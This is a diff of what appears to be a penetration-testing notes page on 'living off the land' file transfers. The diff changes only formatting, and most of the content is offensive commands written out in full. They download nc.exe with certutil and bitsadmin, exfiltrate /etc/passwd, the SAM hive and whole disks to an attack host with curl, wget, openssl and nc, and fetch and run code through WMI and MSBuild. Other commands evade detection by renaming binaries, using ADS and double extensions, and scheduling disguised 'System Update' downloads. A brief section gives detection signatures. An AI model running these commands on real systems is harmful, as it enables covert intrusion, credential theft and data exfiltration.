@@ -1,4 +1,4 @@
-# Living off The Land File Transfers
+# 🎯 Living off the Land Transfers
 
 ## Introduction
 
@@ -7,16 +7,18 @@ The phrase "Living off the land" was coined by Christopher Campbell (@obscuresec
 The term LOLBins (Living off the Land binaries) came from a Twitter discussion on what to call binaries that an attacker can use to perform actions beyond their original purpose. These are legitimate system binaries that can be abused for malicious purposes.
 
 **Key Resources:**
-- **LOLBAS Project** - For Windows Binaries (https://lolbas-project.github.io/)
-- **GTFOBins** - For Linux Binaries (https://gtfobins.github.io/)
+
+* **LOLBAS Project** - For Windows Binaries (https://lolbas-project.github.io/)
+* **GTFOBins** - For Linux Binaries (https://gtfobins.github.io/)
 
 Living off the Land binaries can be used to perform functions such as:
-- **Download** - Retrieve files from remote sources
-- **Upload** - Send files to remote destinations
-- **Command Execution** - Execute arbitrary commands
-- **File Read** - Read sensitive files
-- **File Write** - Write files to disk
-- **Bypasses** - Bypass security controls
+
+* **Download** - Retrieve files from remote sources
+* **Upload** - Send files to remote destinations
+* **Command Execution** - Execute arbitrary commands
+* **File Read** - Read sensitive files
+* **File Write** - Write files to disk
+* **Bypasses** - Bypass security controls
 
 This section focuses on using LOLBAS and GTFOBins projects and provides examples for download and upload functions on Windows & Linux systems.
 
@@ -27,6 +29,7 @@ This section focuses on using LOLBAS and GTFOBins projects and provides examples
 **Description:** Certificate Request utility that can be used to upload files via HTTP POST.
 
 **Upload Files:**
+
 ```cmd
 # Start Netcat listener on attack host
 nc -lvnp 8000
@@ -36,11 +39,13 @@ certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
 ```
 
 **Expected Output:**
+
 ```
 Certificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)
 ```
 
 **Netcat Session Output:**
+
 ```http
 POST / HTTP/1.1
 Cache-Control: no-cache
@@ -67,17 +72,20 @@ MAPI=1
 **Description:** Background Intelligent Transfer Service (BITS) can download files from HTTP sites and SMB shares.
 
 **Download File:**
+
 ```cmd
 bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
 ```
 
 **PowerShell BITS Transfer:**
+
 ```powershell
 Import-Module bitstransfer
 Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
 ```
 
 **Advanced BITS Usage:**
+
 ```powershell
 # Download with credentials
 Start-BitsTransfer -Source "http://10.10.10.32:8000/file.txt" -Destination "C:\temp\file.txt" -Credential (Get-Credential)
@@ -94,17 +102,20 @@ Resume-BitsTransfer -Name "MyTransfer"
 **Description:** Certificate utility that can download arbitrary files. Found by Casey Smith (@subTee).
 
 **Download File:**
+
 ```cmd
 certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
 ```
 
 **Base64 Decode:**
+
 ```cmd
 # Decode base64 file
 certutil -decode encoded_file.txt decoded_file.exe
 ```
 
 **URL Cache Download:**
+
 ```cmd
 certutil.exe -urlcache -split -f http://10.10.10.32:8000/nc.exe nc.exe
 ```
@@ -116,6 +127,7 @@ certutil.exe -urlcache -split -f http://10.10.10.32:8000/nc.exe nc.exe
 **Description:** Built-in utility for extracting compressed files.
 
 **Download and Extract:**
+
 ```cmd
 # Download cabinet file
 expand.exe \\webdav\folder\file.cab c:\ADS\file.cab
@@ -129,6 +141,7 @@ expand.exe -F:* c:\ADS\file.cab c:\ADS\
 **Description:** Extensible Storage Engine (ESE) database utility.
 
 **Download File:**
+
 ```cmd
 esentutl.exe /y \\live.sysinternals.com\tools\adrestore.exe /d \\otherwebdavserver\webdav\adrestore.exe /o
 ```
@@ -138,6 +151,7 @@ esentutl.exe /y \\live.sysinternals.com\tools\adrestore.exe /d \\otherwebdavserv
 **Description:** String search utility that can read files.
 
 **Read Remote Files:**
+
 ```cmd
 findstr /V /L W3AllLov3DonaldTrump \\webdavserver\folder\file.exe > c:\ADS\file.exe
 ```
@@ -147,6 +161,7 @@ findstr /V /L W3AllLov3DonaldTrump \\webdavserver\folder\file.exe > c:\ADS\file.
 **Description:** File replacement utility.
 
 **Download File:**
+
 ```cmd
 replace.exe \\webdav.folder.com\folder\invoice.pdf c:\ADS\ /A
 ```
@@ -156,6 +171,7 @@ replace.exe \\webdav.folder.com\folder\invoice.pdf c:\ADS\ /A
 **Description:** Cabinet file creation utility.
 
 **Upload File (via UNC):**
+
 ```cmd
 makecab \\webdavserver\webdav\nc.exe \\webdavserver\webdav\nc.cab
 ```
@@ -165,6 +181,7 @@ makecab \\webdavserver\webdav\nc.exe \\webdavserver\webdav\nc.cab
 **Description:** Print command that can download files.
 
 **Download File:**
+
 ```cmd
 print /D:\\webdavserver\share\nc.exe \\webdavserver\share\nc.exe
 ```
@@ -174,6 +191,7 @@ print /D:\\webdavserver\share\nc.exe \\webdavserver\share\nc.exe
 **Description:** Registry editor that can save/export files.
 
 **Export Registry to Remote:**
+
 ```cmd
 reg export HKLM\SAM \\webdavserver\folder\SAM
 ```
@@ -183,6 +201,7 @@ reg export HKLM\SAM \\webdavserver\folder\SAM
 **Description:** Extended copy utility.
 
 **Download File:**
+
 ```cmd
 xcopy \\webdavserver\webdav\nc.exe c:\ADS\nc.exe
 ```
@@ -194,6 +213,7 @@ xcopy \\webdavserver\webdav\nc.exe c:\ADS\nc.exe
 **Description:** Cryptographic toolkit that can create SSL connections for file transfer.
 
 **Setup SSL Server (Attack Host):**
+
 ```bash
 # Create certificate
 openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
@@ -203,11 +223,13 @@ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/Lin
 ```
 
 **Download File (Target Host):**
+
 ```bash
 openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
 ```
 
 **Upload File via SSL:**
+
 ```bash
 # Target sends file
 cat /etc/passwd | openssl s_client -quiet -connect 10.10.10.32:443
@@ -221,11 +243,13 @@ openssl s_server -quiet -accept 443 -cert certificate.pem -key key.pem > receive
 **Description:** Web file downloader (if available).
 
 **Download File:**
+
 ```bash
 wget http://10.10.10.32:8000/LinEnum.sh
 ```
 
 **Upload via POST:**
+
 ```bash
 wget --post-file=/etc/passwd http://10.10.10.32:8000/upload
 ```
@@ -235,11 +259,13 @@ wget --post-file=/etc/passwd http://10.10.10.32:8000/upload
 **Description:** Command-line HTTP client.
 
 **Download File:**
+
 ```bash
 curl -o LinEnum.sh http://10.10.10.32:8000/LinEnum.sh
 ```
 
 **Upload File:**
+
 ```bash
 curl -X POST -F "file=@/etc/passwd" http://10.10.10.32:8000/upload
 ```
@@ -249,6 +275,7 @@ curl -X POST -F "file=@/etc/passwd" http://10.10.10.32:8000/upload
 **Description:** Network utility for reading/writing network connections.
 
 **Download File:**
+
 ```bash
 # Attack host
 nc -l -p 8000 < file_to_send.txt
@@ -258,6 +285,7 @@ nc 10.10.10.32 8000 > received_file.txt
 ```
 
 **Upload File:**
+
 ```bash
 # Attack host
 nc -l -p 8000 > received_file.txt
@@ -271,6 +299,7 @@ nc 10.10.10.32 8000 < file_to_send.txt
 **Description:** Extended netcat with additional features.
 
 **Download File:**
+
 ```bash
 # Server
 socat TCP-LISTEN:8000,reuseaddr,fork OPEN:/tmp/file.txt,rdonly
@@ -284,11 +313,13 @@ socat TCP:10.10.10.32:8000 OPEN:/tmp/received_file.txt,creat
 **Description:** Secure Shell utilities.
 
 **Download File:**
+
 ```bash
 scp user@10.10.10.32:/tmp/file.txt /tmp/
 ```
 
 **Upload File:**
+
 ```bash
 scp /tmp/file.txt user@10.10.10.32:/tmp/
 ```
@@ -298,6 +329,7 @@ scp /tmp/file.txt user@10.10.10.32:/tmp/
 **Description:** Base64 encoding/decoding utility.
 
 **Encode and Transfer:**
+
 ```bash
 # Encode file
 base64 /etc/passwd | nc 10.10.10.32 8000
@@ -311,6 +343,7 @@ nc -l -p 8000 | base64 -d > passwd_copy
 **Description:** Hex dump utility.
 
 **Transfer via Hex:**
+
 ```bash
 # Encode
 xxd -p /etc/passwd | nc 10.10.10.32 8000
@@ -324,6 +357,7 @@ nc -l -p 8000 | xxd -r -p > passwd_copy
 **Description:** Archive utility.
 
 **Transfer Archive:**
+
 ```bash
 # Create and send
 tar czf - /etc/ | nc 10.10.10.32 8000
@@ -337,6 +371,7 @@ nc -l -p 8000 | tar xzf - -C /tmp/
 **Description:** Data duplicator/converter.
 
 **Transfer Raw Data:**
+
 ```bash
 # Send disk image
 dd if=/dev/sda | nc 10.10.10.32 8000
@@ -350,6 +385,7 @@ nc -l -p 8000 | dd of=/tmp/disk.img
 ### Windows Registry as Storage
 
 **Store Data in Registry:**
+
 ```cmd
 # Store base64 encoded file in registry
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion" /v "Update" /t REG_SZ /d "base64_encoded_data"
@@ -361,6 +397,7 @@ reg query "HKCU\Software\Microsoft\Windows\CurrentVersion" /v "Update" | findstr
 ### Alternate Data Streams (ADS)
 
 **Hide Files in ADS:**
+
 ```cmd
 # Store file in ADS
 type nc.exe > legitimate_file.txt:nc.exe
@@ -372,6 +409,7 @@ expand legitimate_file.txt:nc.exe nc_recovered.exe
 ### WMI for File Transfer
 
 **Download via WMI:**
+
 ```powershell
 # Create WMI object for HTTP request
 $wmi = [WMIClass]"Win32_Process"
@@ -381,6 +419,7 @@ $wmi.Create("powershell.exe -c `"(New-Object Net.WebClient).DownloadFile('http:/
 ### MSBuild for Execution
 
 **Download and Execute via MSBuild:**
+
 ```xml
 <!-- Save as download.xml -->
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
@@ -397,6 +436,7 @@ msbuild.exe download.xml
 ### Linux Systemd for Persistence
 
 **Create Service for File Transfer:**
+
 ```bash
 # Create service file
 cat > /tmp/download.service << EOF
@@ -421,12 +461,14 @@ systemctl --user start download.service
 ### Hide Data in Images
 
 **Windows - Using forfiles:**
+
 ```cmd
 # Hide data in image metadata
 forfiles /p C:\temp /m *.jpg /c "cmd /c echo secret_data >> @file:metadata"
 ```
 
 **Linux - Using steghide:**
+
 ```bash
 # Hide file in image
 steghide embed -cf cover.jpg -ef secret.txt -p password123
@@ -440,6 +482,7 @@ steghide extract -sf cover.jpg -p password123
 ### Rename Binaries
 
 **Windows:**
+
 ```cmd
 # Copy and rename suspicious binaries
 copy C:\Windows\System32\certutil.exe C:\temp\update.exe
@@ -447,6 +490,7 @@ update.exe -urlcache -split -f http://10.10.10.32:8000/nc.exe
 ```
 
 **Linux:**
+
 ```bash
 # Copy and rename binaries
 cp /usr/bin/wget /tmp/systemupdate
@@ -456,6 +500,7 @@ cp /usr/bin/wget /tmp/systemupdate
 ### Use Legitimate File Extensions
 
 **Disguise Executables:**
+
 ```cmd
 # Rename executable to appear as document
 copy nc.exe important_document.pdf.exe
@@ -467,6 +512,7 @@ copy nc.exe report.txt.exe
 ### Time-based Transfers
 
 **Schedule Transfers:**
+
 ```cmd
 # Windows - Use schtasks
 schtasks /create /tn "System Update" /tr "certutil.exe -urlcache -split -f http://10.10.10.32:8000/update.exe" /sc daily /st 02:00
@@ -480,18 +526,21 @@ echo "0 2 * * * wget -q http://10.10.10.32:8000/update" | crontab -
 ### Monitoring LOLBins Usage
 
 **Windows Event Logs:**
-- Monitor Process Creation Events (Event ID 4688)
-- Monitor PowerShell Script Block Logging (Event ID 4104)
-- Monitor Network Connections (Event ID 3 - Sysmon)
+
+* Monitor Process Creation Events (Event ID 4688)
+* Monitor PowerShell Script Block Logging (Event ID 4104)
+* Monitor Network Connections (Event ID 3 - Sysmon)
 
 **Linux Monitoring:**
-- Monitor syscalls with auditd
-- Use process monitoring tools (ps, top, htop)
-- Monitor network connections (netstat, ss)
+
+* Monitor syscalls with auditd
+* Use process monitoring tools (ps, top, htop)
+* Monitor network connections (netstat, ss)
 
 ### Common Detection Signatures
 
 **Suspicious Command Lines:**
+
 ```cmd
 # Certutil with URL
 certutil.*-urlcache.*-split.*-f.*http
@@ -543,6 +592,7 @@ where certutil bitsadmin powershell wmic
 ### Certificate Errors
 
 **Bypass SSL Certificate Validation:**
+
 ```bash
 # Curl
 curl -k https://10.10.10.32:8000/file.txt
@@ -557,6 +607,7 @@ openssl s_client -connect 10.10.10.32:443 -verify_return_error
 ### Network Restrictions
 
 **Test Connectivity:**
+
 ```bash
 # Test HTTP/HTTPS
 curl -I http://10.10.10.32:8000/
@@ -569,6 +620,7 @@ nc -zv 10.10.10.32 80 443 8000 8080 8443
 ### Binary Not Found
 
 **Alternative Binary Search:**
+
 ```bash
 # Linux - Find alternatives
 find /usr/bin /bin -name "*curl*" -o -name "*wget*" -o -name "*nc*"
@@ -591,9 +643,9 @@ dir /s /b C:\Windows\System32\*bits*.exe
 
 ## References
 
-- [LOLBAS Project](https://lolbas-project.github.io/)
-- [GTFOBins](https://gtfobins.github.io/)
-- [Living Off The Land Binaries and Scripts (and also Libraries)](https://github.com/LOLBAS-Project/LOLBAS)
-- [ATT&CK Framework - Living Off The Land](https://attack.mitre.org/techniques/T1105/)
-- [Microsoft Documentation - Certutil](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
-- [NIST - Application Whitelisting](https://csrc.nist.gov/publications/detail/sp/800-167/final) 
+* [LOLBAS Project](https://lolbas-project.github.io/)
+* [GTFOBins](https://gtfobins.github.io/)
+* [Living Off The Land Binaries and Scripts (and also Libraries)](https://github.com/LOLBAS-Project/LOLBAS)
+* [ATT\&CK Framework - Living Off The Land](https://attack.mitre.org/techniques/T1105/)
+* [Microsoft Documentation - Certutil](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
+* [NIST - Application Whitelisting](https://csrc.nist.gov/publications/detail/sp/800-167/final)
